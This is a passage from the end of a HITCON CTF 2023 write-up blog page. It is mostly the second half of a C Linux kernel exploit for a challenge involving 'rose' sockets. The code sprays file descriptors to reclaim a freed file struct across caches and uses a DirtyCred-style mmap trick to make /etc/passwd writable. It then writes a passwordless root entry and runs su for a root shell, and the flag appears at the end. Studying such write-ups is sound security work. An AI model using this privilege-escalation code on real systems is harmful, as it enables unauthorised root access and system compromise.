</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 6: Fulfill the partial list and discard the target slab (because it&#39;s empty) to per_cpu_pages&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// The page (order 1) will be discarded, and it goes to per_cpu_pages (__free_pages -&gt; free_the_page -&gt; free_unref_page -&gt; free_unref_page_commit)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// We need to make it goes to the free area instead of per_cpu_pages
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 7
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 7: Make PCP freelist full, so that page goes to free area in buddy&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_deinit</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// We try to make the page stored in pcp goes to free area by making
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// the pcp freelist full. 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Free all allocation that we&#39;ve made before to trigger it, and after that
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// We can start our cross-cach exploitation.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=======================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Start the main exploit&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Trigger cross-cache, file will use the freed page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Spray FDs&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">spray_fds</span><span class="p">[</span><span class="n">NUM_SPRAY_FDS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">NUM_SPRAY_FDS</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/a&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span> <span class="c1">// /tmp/a is a writable file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;Failed to open FDs&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Before: 2 fd 1 refcount (rose_fds[1] &amp; spray_fds[i])
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Free one of the FDs via rose&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">rose_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 1 fd but pointed chunk is free
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Spray to replace the previously freed chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Set the lseek to 0x8, so that we can find easily the fd
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Find the freed FD using lseek&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">spray_fds_2</span><span class="p">[</span><span class="n">NUM_SPRAY_FDS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_SPRAY_FDS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">spray_fds_2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/a&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">lseek</span><span class="p">(</span><span class="n">spray_fds_2</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 2 fd 1 refcount (Because new file)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// The freed fd will have lseek value set to 0x8. Try to find it.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_SPRAY_FDS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">lseek</span><span class="p">(</span><span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span> <span class="p">,</span><span class="n">SEEK_CUR</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">freed_fd</span> <span class="o">=</span> <span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nf">lseek</span><span class="p">(</span><span class="n">freed_fd</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Found freed fd: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">freed_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">freed_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;Failed to find FD&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// mmap trick instead of race with write
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] DirtyCred via mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">file_mmap</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">freed_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 3 fd 2 refcount (Because new file)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">freed_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 2 fd 1 refcount (Because new file)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_SPRAY_FDS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">spray_fds_2</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 1 fd 0 refcount (Because new file)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Effect: FD in mmap (which is writeable) can be replaced with RDONLY file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_SPRAY_FDS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">spray_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/etc/passwd&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// After: 2 fd 1 refcount (but writeable due to mmap)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">file_mmap</span><span class="p">,</span> <span class="s">&#34;root::0:0:root:/root:/bin/sh</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Finished! Open root shell...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=======================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;su&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, it&rsquo;s time to upload the script to the remote shell and try to execute it.</p>
<img src="https://i.imgur.com/DHV83QT.png"/>
<p>We got the flag :D</p>
<blockquote>
<p><strong>Flag: hitcon{The_right_way_of_pronouncing_pipe_is_pee_pay&mdash;Inugami_Korone}</strong></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/hitcon-ctf-2023/" data-title="HITCON CTF 2023" data-via="Chovid99" data-hashtags="Writeup,HITCON,pwn,kernel,cross-cache,DirtyCred,2023"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/hitcon-ctf-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/hitcon/">HITCON</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/kernel/">Kernel</a>,&nbsp;<a href="/tags/cross-cache/">Cross-Cache</a>,&nbsp;<a href="/tags/dirtycred/">DirtyCred</a>,&nbsp;<a href="/tags/2023/">2023</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/sekaictf-2023/" class="prev" rel="prev" title="SekaiCTF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>SekaiCTF 2023</a>
            <a href="/posts/blackhat-mea-ctf-2023/" class="next" rel="next" title="BlackHat MEA CTF 2023">BlackHat MEA CTF 2023<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
